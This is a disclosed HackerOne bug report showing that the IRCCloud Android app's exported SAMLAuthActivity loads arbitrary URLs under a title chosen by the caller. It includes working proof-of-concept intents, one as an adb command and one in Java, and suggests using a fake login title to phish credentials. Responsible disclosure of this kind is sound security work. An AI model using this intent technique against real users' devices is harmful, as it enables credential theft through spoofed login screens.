# [IRCCloud Android] Opening arbitrary URLs/XSS in SAMLAuthActivity

## Report Details
- **Report ID**: 283058
- **URL**: https://hackerone.com/reports/283058
- **State**: Closed
- **Severity**: medium
- **Submitted**: 2017-10-26T11:30:14.005Z
- **Disclosed**: 2017-11-03T11:37:05.224Z

## Reporter
- **Username**: bagipro
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: irccloud

## Vulnerability Information
Hi, I'd like to report a bug which allow to open arbitrary URLs in ```com.irccloud.android.activity.SAMLAuthActivity```

This activity is exported:
```xml
        <activity android:name="com.irccloud.android.activity.SAMLAuthActivity" android:theme="@style/dawn" android:windowSoftInputMode="adjustResize">
            <intent-filter>
                <action android:name="android.intent.action.VIEW"/>
                <category android:name="android.intent.category.DEFAULT"/>
            </intent-filter>
        </activity>
```
it means that it can be accessed by any third-party apps installed on the same device. On the newest Androids it also could be exploited by Android Instant Apps directly from a web-browser.

In file ```  ``` can see that it opens attacker provided URLs
```java
        if (getIntent() == null || !getIntent().hasExtra("auth_url")) {
            finish();
            return;
        }
        getSupportActionBar().setTitle(getIntent().getStringExtra("title"));
        this.mWebView.loadUrl(getIntent().getStringExtra("auth_url"));
```

PoC from ADB:
```
adb shell am start -n com.irccloud.android/com.irccloud.android.activity.SAMLAuthActivity -e title "ATTAAACK" -e auth_url "http://google.com/"
```

PoC in Java:
```java
        Intent intent = new Intent();
        intent.setClassName("com.irccloud.android", "com.irccloud.android.activity.SAMLAuthActivity");
        intent.putExtra("title", "ATTAAACK");
        intent.putExtra("auth_url", "http://google.com/");
        startActivity(intent);
```

Result:
{F233002}
{F233003}

It's dangerous because user doesn't see real URL. Attacker can open anything and specify any title (like "IRCCloud: Login Required"), and using that trick steal user credentials.

You can test this issue by yourself, APK is attached

## Attachments
- 2017-10-26_14-17-33.jpg
- 2017-10-26_14-15-36.jpg
- app-release.apk
